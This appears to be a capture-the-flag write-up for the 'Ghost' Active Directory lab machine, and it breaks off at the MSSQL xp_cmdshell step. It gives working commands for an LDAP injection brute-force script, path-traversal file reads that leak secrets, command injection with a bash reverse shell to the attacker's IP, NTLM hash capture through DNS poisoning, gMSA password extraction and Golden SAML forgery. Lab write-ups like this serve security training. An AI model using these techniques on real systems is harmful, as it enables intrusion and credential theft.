content:
Summary # Ghost is an Insane Windows Active Directory machine that demonstrates the exploitation of multiple technologies across a multi-domain forest. The attack chain begins with an LDAP injection vulnerability to recover Gitea credentials, followed by source code analysis to exploit arbitrary file read and remote code execution vulnerabilities on a Linux host. Access to Active Directory is achieved by extracting a Kerberos ticket, enabling DNS manipulation to capture another user’s NTLM hash. The compromise continues by abusing Group Managed Service Accounts (gMSAs) to recover an AD FS service account password, which is then used to forge a Golden SAML assertion and access a database management application. Finally, abuse of linked MSSQL servers, privilege escalation, and the parent-child trust relationship culminate in an ExtraSIDs Golden Ticket attack, resulting in the complete compromise of the Active Directory forest.
Reconnaissance # Rustscan # We start with Rustscan to quickly identify all the open ports from the total of 65535 possible ports.
└─$ rustscan -a 10.129.231.105 -r 0-65535 PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 80/tcp open http syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 443/tcp open https syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 1433/tcp open ms-sql-s syn-ack ttl 127 2179/tcp open vmrdp syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 3389/tcp open ms-wbt-server syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 8008/tcp open http syn-ack ttl 127 8443/tcp open https-alt syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 49443/tcp open unknown syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49672/tcp open unknown syn-ack ttl 127 49680/tcp open unknown syn-ack ttl 127 57388/tcp open unknown syn-ack ttl 127 58253/tcp open unknown syn-ack ttl 127 58399/tcp open unknown syn-ack ttl 127 Nmap # After identifying the open ports using Rustscan, we will perform detailed enumeration of each open port using Nmap:
└─$ nmap 10.129.231.105 -T4 -sC -sV -p 53,80,88,135,139,389,443,445,464,593,636,1433,2179,3268,3269,5985,8008,8443,9389,49443,49664,49672,49680,57388,58253,58399 Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-14 10:28 +0500 Nmap scan report for 10.129.231.105 Host is up (0.28s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-07-14 05:28:39Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=DC01.ghost.htb | Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb | Not valid before: 2024-06-19T15:45:56 |_Not valid after: 2124-06-19T15:55:55 443/tcp open https? 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.ghost.htb | Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb | Not valid before: 2024-06-19T15:45:56 |_Not valid after: 2124-06-19T15:55:55 |_ssl-date: TLS randomness does not represent time 1433/tcp open ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM | ms-sql-ntlm-info: | 10.129.231.105:1433: | Target_Name: GHOST | NetBIOS_Domain_Name: GHOST | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: ghost.htb | DNS_Computer_Name: DC01.ghost.htb | DNS_Tree_Name: ghost.htb |_ Product_Version: 10.0.20348 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2026-07-14T05:14:30 |_Not valid after: 2056-07-14T05:14:30 | ms-sql-info: | 10.129.231.105:1433: | Version: | name: Microsoft SQL Server 2022 RTM | number: 16.00.1000.00 | Product: Microsoft SQL Server 2022 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 |_ssl-date: 2026-07-14T05:30:12+00:00; +2s from scanner time. 2179/tcp open vmrdp? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=DC01.ghost.htb | Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb | Not valid before: 2024-06-19T15:45:56 |_Not valid after: 2124-06-19T15:55:55 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=DC01.ghost.htb | Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb | Not valid before: 2024-06-19T15:45:56 |_Not valid after: 2124-06-19T15:55:55 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 8008/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Ghost | http-robots.txt: 5 disallowed entries |_/ghost/ /p/ /email/ /r/ /webmentions/receive/ |_http-generator: Ghost 5.78 8443/tcp open ssl/http nginx 1.18.0 (Ubuntu) | http-title: Ghost Core |_Requested resource was /login | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time | tls-nextprotoneg: |_ http/1.1 |_http-server-header: nginx/1.18.0 (Ubuntu) | ssl-cert: Subject: commonName=core.ghost.htb | Subject Alternative Name: DNS:core.ghost.htb | Not valid before: 2024-06-18T15:14:02 |_Not valid after: 2124-05-25T15:14:02 9389/tcp open mc-nmf .NET Message Framing 49443/tcp open unknown 49664/tcp open msrpc Microsoft Windows RPC 49672/tcp open msrpc Microsoft Windows RPC 49680/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 57388/tcp open msrpc Microsoft Windows RPC 58253/tcp open msrpc Microsoft Windows RPC 58399/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC01; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel Host script results: | smb2-time: | date: 2026-07-14T05:29:32 |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required |_clock-skew: mean: 1s, deviation: 0s, median: 1s From the output, it can be seen that the Domain name is ghost.htb and the target host’s DNS name is DC01.ghost.htb. We can add these entries to our /etc/hosts for proper name resolution:
└─$ sudo nano /etc/hosts 10.129.231.105 DC01.ghost.htb DC01 ghost.htb To also sync the system time with the DC:
└─$ sudo ntpdate 10.129.231.105 Initial Access # We are not provided with any domain credentials so we can start with checking if null authentication is allowed on SMB with Netexec:
└─$ nxc smb 10.129.231.105 -u '' -p '' SMB 10.129.231.105 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True) SMB 10.129.231.105 445 DC01 [+] ghost.htb\: From the output, null authentication is allowed but when we tried enumerating shares we see STATUS_ACCESS_DENIED error:
└─$ nxc smb 10.129.231.105 -u '' -p '' --shares SMB 10.129.231.105 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True) SMB 10.129.231.105 445 DC01 [+] ghost.htb\: SMB 10.129.231.105 445 DC01 [-] Error enumerating shares: STATUS_ACCESS_DENIED LDAP Injection # Next we can check what web application is accessible on the 8008 port as we can see from the Nmap scan that Nginx server is running there
The website shows a single introductory article related to the site by author Kathryn Holland. There is nothing much of interest on the article page. From the robots.txt scanned by nmap, visiting the /ghost endpoint shows a login page which again we don’t have any credentials for and trying default credentials didn’t work either
We can move forward fuzzing for subdomains with Ffuf:
└─$ ffuf -u 'http://ghost.htb:8008' -H 'Host: FUZZ.ghost.htb' -ic -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 50 -fc 404 -fs 0,7676 /'___\ /'___\ /'___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://ghost.htb:8008 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.ghost.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 50 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response status: 404 :: Filter : Response size: 0,7676 ________________________________________________ intranet [Status: 307, Size: 3968, Words: 52, Lines: 1, Duration: 251ms] From the output, we identified a subdomain intranet which we can add to our /etc/hosts file. Visiting the subdomain shows another login page asking for username and a secret
After trying to login with arbitrary username and secret, we see an HTTP request passing as POST in the multipart form data format.
The username and secret values are named as 1_ldap-username and 1_ldap-secret. The mentioning of LDAP suggests that the website maybe using LDAP authentication and the login form can be vulnerable to LDAP injection attacks. If the login form is vulnerable, we can log in to the site by using * in both username and secret fields. In LDAP, * is used as a wildcard which means to match everything. If in the backend the website is using simple vulnerable LDAP query like:
(&(username=)(secret=)) Passing * in both fields results in (&(username=*)(secret=*)) which evaluates to true and will login us using the first matched account in the list.
We successfully log in to the website and we can see in the News section that Gitea is being migrated to Bitbucket and domain logins for all users are disabled. They are provided a temporary gitea_temp_principal account and mentioned that its password can be asked from sysadmins by IT members and sysadmins can access the password in the LDAP attribute but the specific attribute is not mentioned. In the Users section, we can see 11 usernames which are probably domain accounts. Then in the Forum section, we can find two more unique usernames. We can save them in a user.txt wordlist and use Kerbrute tool to verify if they are valid domain accounts with command:
└─$ ./kerbrute_linux_amd64 userenum --dc 10.129.231.105 -d ghost.htb users.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ / ,< / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/ Version: dev (9cfb81e) - 07/14/26 - Ronnie Flathers @ropnop 2026/07/14 14:23:40 > Using KDC(s): 2026/07/14 14:23:40 > 10.129.231.105:88 2026/07/14 14:23:40 > [+] VALID USERNAME: kathryn.holland@ghost.htb 2026/07/14 14:23:40 > [+] VALID USERNAME: jason.taylor@ghost.htb 2026/07/14 14:23:40 > [+] VALID USERNAME: cassandra.shelton@ghost.htb 2026/07/14 14:23:40 > [+] VALID USERNAME: justin.bradley@ghost.htb 2026/07/14 14:23:40 > [+] VALID USERNAME: robert.steeves@ghost.htb 2026/07/14 14:23:40 > [+] VALID USERNAME: intranet_principal@ghost.htb 2026/07/14 14:23:40 > [+] VALID USERNAME: charles.gray@ghost.htb 2026/07/14 14:23:40 > [+] VALID USERNAME: beth.clark@ghost.htb 2026/07/14 14:23:40 > [+] VALID USERNAME: florence.ramirez@ghost.htb 2026/07/14 14:23:40 > [+] VALID USERNAME: arthur.boyd@ghost.htb 2026/07/14 14:23:40 > [+] VALID USERNAME: gitea_temp_principal@ghost.htb 2026/07/14 14:23:40 > [+] VALID USERNAME: beth.clark@ghost.htb 2026/07/14 14:23:40 > [+] VALID USERNAME: jason.taylor@ghost.htb 2026/07/14 14:23:40 > Done! Tested 13 usernames (13 valid) in 0.560 seconds The tool successfully verifies that all 13 usernames are domain accounts. This info may be useful for us later. Now to work towards finding the password of gitea_temp_principal, we can again use the login form but this time we need to enumerate the account’s password letter by letter using wildcard injection. As the website throws error but shows a 200 code when the login is unsuccessfull and shows 303 code with token cookie in response when the login is successfull, we can use the following python script which enumerates the password using this difference in the responses:
#!/usr/bin/env python3 import json import re import string import requests BASE_URL = "http://intranet.ghost.htb:8008/login" # Character set to brute-force CHARSET = string.ascii_letters + string.digits def fetch_action_data(session): """Retrieve the dynamic values required for the POST request.""" page = session.get(BASE_URL).text action_json = re.search( r'name="\$ACTION_1:0"\s+value="([^"]+)"', page ).group(1).replace("&quot;", '"') action_key = re.search( r'name="\$ACTION_KEY"\s+value="([^"]+)"', page ).group(1) next_action = json.loads(action_json)["id"] return action_json, action_key, next_action def recover_password(): session = requests.Session() action_json, action_key, next_action = fetch_action_data(session) headers = { "Next-Action": next_action } password = "" attempts = 1 while True: found = False for ch in CHARSET: candidate = password + ch + "*" print( f"\r[{attempts:04d}] Current: '{password}' | Testing: '{candidate}'", end="", flush=True ) attempts += 1 data = { "1_$ACTION_REF_1": "", "1_$ACTION_1:0": action_json, "1_$ACTION_1:1": "[{}]", "1_$ACTION_KEY": action_key, "1_ldap-username": "gitea_temp_principal", "1_ldap-secret": candidate, "0": '[{},"$K1"]' } response = session.post( BASE_URL, headers=headers, data=data, allow_redirects=False ) if response.status_code == 303: password += ch print(f"\r[+] Found prefix: {password}{' ' * 40}") found = True break if not found: break print(f"\n\n[+] Recovered password: {password}") if __name__ == "__main__": recover_password() We can run it with:
└─$ chmod 744 tokenBrute.py └─$ python3 tokenBrute.py [+] Found prefix: s [+] Found prefix: sz [+] Found prefix: szr [+] Found prefix: szrr [+] Found prefix: szrr8 [+] Found prefix: szrr8k [+] Found prefix: szrr8kp [+] Found prefix: szrr8kpc [+] Found prefix: szrr8kpc3 [+] Found prefix: szrr8kpc3z [+] Found prefix: szrr8kpc3z6 [+] Found prefix: szrr8kpc3z6o [+] Found prefix: szrr8kpc3z6on [+] Found prefix: szrr8kpc3z6onl [+] Found prefix: szrr8kpc3z6onlq [+] Found prefix: szrr8kpc3z6onlqf [0439] Current: 'szrr8kpc3z6onlqf' | Testing: 'szrr8kpc3z6onlqf9*' [+] Recovered password: szrr8kpc3z6onlqf The script found the password for gitea_temp_principal as szrr8kpc3z6onlqf. We can add the gitea.ghost.htb subdomain to /etc/hosts and access it in the browser.
Source Code Analysis # After the login to the site, we can see two private repositories.
Opening the ghost-dev / blog repo shows the following page
The repo’s README.md tells that the blog uses Ghost CMS in a Docker container. They have modified some Ghost CMS’ source code to add new features to the site and the code is written in the custom coded posts-public.js file. There is also mentioned that blog and intranet are being integrated so that intranet can feature some posts from blog and scan its URLs. But as the functionality is still in development, they had locked them behind an API key named DEV_INTRANET_KEY which is said to be set as the environment variable. We are provided with a public API key of Ghost as a5af628828958c976a3b6cc81a.
As the code in posts-public.js is custom coded, we can compare it with the official code file of Ghost CMS. To find the exact version of the current Ghost CMS website at http://ghost.htb:8008/, we can use the methods discussed in the article here.
Using the 3rd method, we find the version as 5.78
We can download the version 5.78 source code files from the official GitHub repo at link and then compare the original posts-public.js and the custom coded posts-public.js from the Gitea repo.
Comparing the modified file against the original reveals that the query() function has been changed to an asynchronous function and now accepts an additional extra query parameter. If this parameter is supplied, the application attempts to read a file from the /var/lib/ghost/extra/ directory and embeds its contents into the API response under the meta.extra field. This custom functionality introduces a file-reading capability that was not present in the original implementation, making it a promising area to investigate for potential Local File Inclusion (LFI) vulnerabilities.
We can find the API endpoint which handles requests for posts in their official documentation. At the content-api page, we find the example API endpoint as
# cURL # Real endpoint - copy and paste to see! curl -H "Accept-Version: v6.0" "https://demo.ghost.io/ghost/api/content/posts/?key=22444f78447824223cefc48062" We can replace the domain with ghost.htb:8008 and the key with a5af628828958c976a3b6cc81a which we are provided in the Gitea repo README.md and use curl to see if we can get the results for posts in the output:
└─$ curl 'http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a' | jq { "posts": [ { "id": "65bdd2dc26db7d00010704b5", "uuid": "22db47b3-bbf6-426d-9fcf-887363df82cf", "title": "Embarking on the Supernatural Journey: Welcome to Ghost!", "slug": "embarking-on-the-supernatural-journey-welcome-to-ghost", "html": "<p>Greetings, fellow seekers of the unknown!</p><p>It is with great excitement and a touch of trepidation that we welcome you to the digital realm of Ghost, your go-to destination for unraveling the mysteries that lie beyond the veil of the ordinary. As we embark on this supernatural journey together, allow us to extend our <...SNIP...> it's a portal to the enigmatic, a gateway to the supernatural, and a testament to the boundless curiosity that defines the human spirit.</p><p>Welcome to our realm. Let the haunting begin!</p><p>Happy ghost hunting,</p><p>The Ghost Team</p>", "comment_id": "659cdeec9cd6330001baefbf", "feature_image": null, "featured": true, "visibility": "public", "created_at": "2024-01-09T05:51:40.000+00:00", "updated_at": "2024-01-09T05:52:59.000+00:00", "published_at": "2024-01-09T05:52:29.000+00:00", "custom_excerpt": null, "codeinjection_head": null, "codeinjection_foot": null, "custom_template": null, "canonical_url": null, "url": "http://ghost.htb/embarking-on-the-supernatural-journey-welcome-to-ghost/", "excerpt": "Greetings, fellow seekers of the unknown!\n\nIt is with great excitement and a touch of <...SNIP...> supernatural has been etched into the fabric of human history. From anc", "reading_time": 1, "access": true, "comments": false, "og_image": null, "og_title": null, "og_description": null, "twitter_image": null, "twitter_title": null, "twitter_description": null, "meta_title": null, "meta_description": null, "email_subject": null, "frontmatter": null, "feature_image_alt": null, "feature_image_caption": null } ], "meta": { "pagination": { "page": 1, "limit": 15, "pages": 1, "total": 1, "next": null, "prev": null } } } Arbitrary File Read # As we can see, the endpoint successfully outputs the post’s data. To check if the LFI vulnerability exists in the extra query parameter:
└─$ curl -s 'http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../etc/hosts' | jq -r '.meta.extra[]' 127.0.0.1 localhost ::1 localhost ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 172.19.0.2 26ae7990f3dd From the output it is revealed that the parameter is indeed vulnerable to LFI. As it was mentioned before that the environment variable DEV_INTRANET_KEY is set, we can try to read it using /proc/self/environ:
└─$ curl -s 'http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../proc/self/environ' | jq -r '.meta.extra[]' | tr '\0' '\n' HOSTNAME=26ae7990f3dd database__debug=false YARN_VERSION=1.22.19 PWD=/var/lib/ghost NODE_ENV=production database__connection__filename=content/data/ghost.db HOME=/home/node database__client=sqlite3 url=http://ghost.htb DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe database__useNullAsDefault=true GHOST_CONTENT=/var/lib/ghost/content SHLVL=0 GHOST_CLI_VERSION=1.25.3 GHOST_INSTALL=/var/lib/ghost PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin NODE_VERSION=18.19.0 GHOST_VERSION=5.78.0 Remote Code Execution # As we have the API key for the new functionalities added, we can search in intranet repo if we can find any interesting API endpoint that uses the API key. Looking in intranet repository at intranet/backend/src/api/dev/scan.rs, we see a Rust code implementing functionality to scan the URL being submitted. The critical part is that the user submitted data is directly used in the bash command without any sanitization which introduces Command Injection vulnerability.
From the code, the endpoint expects a HTTP POST request “/scan”, wants the content type as json and data as url parameter in POST body. Looking in dev.rs at intranet/backend/src/dev/ shows that the DevGuard matches the API key in X-DEV-INTRANET-KEY to the one set in the DEV_INTRANET_KEY environment variable
From the README.md, it is known that the API endpoints are exposed at http://intranet.ghost.htb/dev-api
As the web app is running on port 8008, we will query the API by adding the specified port in curl command:
└─$ curl -s -X POST 'http://intranet.ghost.htb:8008/api-dev/scan' -H 'Content-Type: application/json' -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -d '{"url": "http://example.com"}' | jq { "is_safe": true, "temp_command_success": true, "temp_command_stdout": "", "temp_command_stderr": "bash: line 1: intranet_url_check: command not found\n" } We see an error that “bash: line 1: intranet_url_check: command not found” which is expected as in the scan.rs file, the comment mentions that the intranet_url_check is not implemented
We can now add shell metacharacters to test for command injection in the url parameter:
└─$ curl -s -X POST 'http://intranet.ghost.htb:8008/api-dev/scan' -H 'Content-Type: application/json' -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -d '{"url": "http://example.com; id"}' | jq { "is_safe": true, "temp_command_success": true, "temp_command_stdout": "uid=0(root) gid=0(root) groups=0(root)\n", "temp_command_stderr": "bash: line 1: intranet_url_check: command not found\n" } The output of command id is reflected in temp_command_stdout parameter in the response. To get access to the system, we can execute a reverse shell command. Start the listener and execute the reverse shell command as:
└─$ curl -s -X POST 'http://intranet.ghost.htb:8008/api-dev/scan' -H 'Content-Type: application/json' -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -d '{"url": "http://example.com; bash -i >& /dev/tcp/10.10.14.66/9090 0>&1"}' | jq Back in the listener we can see that we gained a shell as root
Upgrade the reverse shell to TTY with:
root@36b733906694:/app# python3 -c 'import pty;pty.spawn("/bin/bash")' root@36b733906694:/app# zsh: suspended rlwrap nc -lnvp 9090 └─$ stty raw -echo;fg [1] + continued rlwrap nc -lnvp 9090 root@36b733906694:/app# Kerberos Ticket Extraction # The presence of .dockerenv in the root (/) directory confirms that we are in a Docker container. Besides the .dockerenv, docker-entrypoint.sh script is also present which contains the content:
root@36b733906694:/app# cat /docker-entrypoint.sh cat /docker-entrypoint.sh #!/bin/bash mkdir /root/.ssh mkdir /root/.ssh/controlmaster printf 'Host *\n ControlMaster auto\n ControlPath ~/.ssh/controlmaster/%%r@%%h:%%p\n ControlPersist yes' > /root/.ssh/config exec /app/ghost_intranet The script configures SSH connection multiplexing before launching the application. SSH multiplexing allows multiple SSH sessions to reuse a single underlying TCP connection, reducing the overhead of establishing a new connection for every request. This is achieved by creating a Unix domain socket, a special file used for inter-process communication on the local system, under /root/.ssh/controlmaster/. Subsequent SSH connections to the same host communicate through this socket instead of creating a new network connection. Finally, the script starts the ghost_intranet application, indicating that it is the primary process running inside the container.
The file in controlmaster shows that there’s a connection to dev-workstation as user florence.ramirez:
root@36b733906694:~/.ssh/controlmaster# ls florence.ramirez@ghost.htb@dev-workstation:22 With this file, we can use SSH to connect to the host without providing any password or authentication:
root@36b733906694:~/.ssh/controlmaster# ssh florence.ramirez@ghost.htb@dev-workstation We can see in the env variables that a KRB5CCNAME environment variable is set pointing to /tmp/krb5cc_50.

DNS Manipulation and NTLM Hash Capture # Going back to the intranet.ghost.htb, before in the Forum section, a user was having issue with accessing the bitbucket.ghost.htb to which Kathryn replied by saying that the DNS is not configured because migration is not ready yet. The user mentioned that a script was running successfully for checking pipeline results in Gitea but it failed to work with Bitbucket.
As the user’s script is constantly trying to query the bitbucket.ghost.htb, we can try adding a DNS entry for it in the Active Directory domain by pointing it to our IP address. We can start Responder to make the user authenticate to us via SMB so we can steal the NTLMv2 Challenge-Response hashes for offline cracking:
└─$ sudo responder -I tun0 Now to add the DNS entry for bitbucket:
└─$ bloodyad -u 'florence.ramirez' -d 'ghost.htb' -i '10.129.231.105' -H 'DC01.ghost.htb' -k ccache=florence.ramirez.ccache add dnsRecord 'bitbucket' '10.10.14.66' [+] bitbucket has been successfully added We can see in the terminal running Responder that it has received the NTLMv2 challenge hashes from justin.bradley
To crack it, write the hash content in a file and use Hashcat with mode 5600:
└─$ hashcat -m 5600 justinNTLMv2.hash /usr/share/wordlists/rockyou.txt Hashcat successfully cracks the hash and identified the plaintext password as Qwertyuiop1234$$
Shell as justin.bradley # Reviewing the group memberships of the user in Bloodhound revealed that the user is a member of “Remote Management Users” so we can log in via evil-winrm:
└─$ evil-winrm -i 10.129.231.105 -u 'justin.bradley' -p 'Qwertyuiop1234$$' The user.txt can be found in desktop folder of justin.bradley
Escalating Privileges # gMSA Password Extraction # Looking at the rights of justin.bradley in Bloodhound revealed that it can read gMSA password of ADFS_GMSA$ machine account.
We can use Netexec –gmsa option to retrieve the NTLM hash of the account:
└─$ netexec ldap 10.129.231.105 -u 'justin.bradley' -p 'Qwertyuiop1234$$' --gmsa LDAP 10.129.231.105 389 DC01 [*] Windows Server 2022 Build 20348 (name:DC01) (domain:ghost.htb) (signing:None) (channel binding:Never) LDAP 10.129.231.105 389 DC01 [+] ghost.htb\justin.bradley:Qwertyuiop1234$$ LDAP 10.129.231.105 389 DC01 [*] Getting GMSA Passwords LDAP 10.129.231.105 389 DC01 Account: adfs_gmsa$ NTLM: 32e35adb7636bf4d12332d16afcb651f PrincipalsAllowedToReadPassword: ['DC01$', 'justin.bradley'] Active Directory Federation Services (AD FS) is a Microsoft software component that provides secure Single Sign-On (SSO) and federated identity management. It allows users to access applications across different organizations, platforms, or cloud networks using a single set of credentials. It can use authentication methods like SAML, OAuth, WS-Fed.
The website running on https://core.ghost.htb:8443 redirects us to federation.ghost.htb which has the login page that ADFS uses to authenticate us and provide a SAML response that is then sent to the initial website we tried to access.
We can use the credentials of Justin but after authenticating, we are shown access denied page on the core.ghost.htb domain and told that only Administrator can access it.
Looking in the HTTP POST request, we can see that the POST body contains a single SAMLResponse parameter that is being sent to /adfs/saml/postResponse endpoint of core.ghost.htb domain.
Using the Burpsuite extension SAML Raider, we can see the decoded SAML as:

Golden SAML Attack # We have access to the the account ADFS_GMSA$ that the ADFS service runs as. We can use it to perform Golden SAML Attack by extracting the signing certificate and the private key from the server. To perform the attack, we need ADFSDump and ADFSpoof.py

Using the details, we can forge a SAML response to impersonate Administrator to the core.ghost.htb who has the sole access to the website. To use the keys, we need to convert them into their binary format which can be done by following commands:
# For private key └─$ echo '8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1' | tr -d '-' | xxd -r -p > dkmKey.bin # For signing certificate └─$ echo AAAAAQA[...]EUSTXxm | base64 -d > EncryptedPfx.bin The required dependencies for running ADFSpoof.py are old and don’t exist in latest python versions. For this, we need to setup a python version management tool pyenv which we can use to install older python versions without causing a conflict between our system-wide python installations. For this, use the following commands to setup it:
First, install the required dependencies:
└─$ sudo apt update && sudo apt install -y build-essential curl git libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget llvm libncursesw5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev libffi-dev liblzma-dev Install pyenv using the official installer:
└─$ curl https://pyenv.run | bash Add the following lines to ~/.bashrc (or ~/.zshrc if using Zsh):
export PYENV_ROOT="$HOME/.pyenv" [[ -d $PYENV_ROOT/bin ]] && export PATH="$PYENV_ROOT/bin:$PATH" eval "$(pyenv init - <bash or zsh>)" Reload the shell configuration:
└─$ source ~/.bashrc # or source ~/.zshrc Verify that pyenv has been installed successfully:
└─$ pyenv --version Install the required Python version:
└─$ pyenv install 3.11.14 Navigate to the ADFSpoof.py folder and set the python version to be used for it locally:
└─$ cd ADFSpoof └─$ pyenv local 3.11.14 Create a separate virtual environment to keep python packages for this tool separate:
└─$ python -m venv ./venv Activate the virtual environment and use pip to install the ADFSpoof tool’s dependencies:
└─$ source venv/bin/activate └─$ pip install -r requirements.txt Confirm that the tool work with:
└─$ chmod 744 ADFSpoof.py └─$ python ADFSpoof.py -h If all went successfully without any error, we can now use the tool to forge the SAML with command:
└─$ python ADFSpoof.py -b EncryptedPfx.bin dkmKey.bin -s 'core.ghost.htb' saml2 --endpoint 'https://core.ghost.htb:8443/adfs/saml/postResponse' --nameidformat 'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress' --nameid 'Administrator@ghost.htb' --rpidentifier 'https://core.ghost.htb:8443' --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue>Administrator@ghost.htb</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"><AttributeValue>Administrator</AttributeValue></Attribute>' Send the POST request in Burpsuite to the Repeater tab that sends the SAML response to the website and replace the content with the SAML we created with the tool. After that, send the request to the website and see that it shows a 302 response
We can right-click the request > Open response in browser and copy the link to visit in the Burp’s browser. We can see that we successfully authenticated to the website as Administrator and we are shown a Database Debug page that we can use to run MSSQL queries.
Linked MSSQL Abuse # To check what user we are currently logged in as:
SELECT SUSER_SNAME(); As from the output, it is revealed that we are authenticated as username “web_client”. From the page’s text, it is observed that the Active DIrectory has two domains and MSSQL servers are configured in both domains and linked with each other. To find the linked servers:
SP_LINKEDSERVERS; The MSSQL server we are authenticated to is DC01 and the server that we are linked to is PRIMARY. We can find the remote user who is running the linked server PRIMARY with query:
EXEC ('SELECT SUSER_SNAME();') AT [PRIMARY]; The user is identified as “bridge_corp”. As in MSSQL, if we are granted impersonate privileges, we can run the queries under different user’s context. To find if we have impersonate privileges in the current MSSQL server:
SELECT grantee.name AS Grantee, grantor.name AS Grantor, target.name AS CanImpersonate FROM sys.server_permissions p JOIN sys.server_principals grantee ON p.grantee_principal_id = grantee.principal_id JOIN sys.server_principals target ON p.major_id = target.principal_id JOIN sys.server_principals grantor ON p.grantor_principal_id = grantor.principal_id WHERE p.permission_name = 'IMPERSONATE'; The empty output shows that there is no impersonate privileges granted. To check for the same in the linked server PRIMARY:
EXEC (' SELECT grantee.name AS Grantee, target.name AS CanImpersonate FROM sys.server_permissions p JOIN sys.server_principals grantee ON p.grantee_principal_id = grantee.principal_id JOIN sys.server_principals target ON p.major_id = target.principal_id WHERE p.permission_name = ''IMPERSONATE''; ') AT [PRIMARY]; The output revealed that bridge_corp can impersonate the SQL Server sa login, which is the built-in SQL Server administrator account. We can use the remote server user account bridge_corp to execute commands on the system using xp_cmdshell with query:
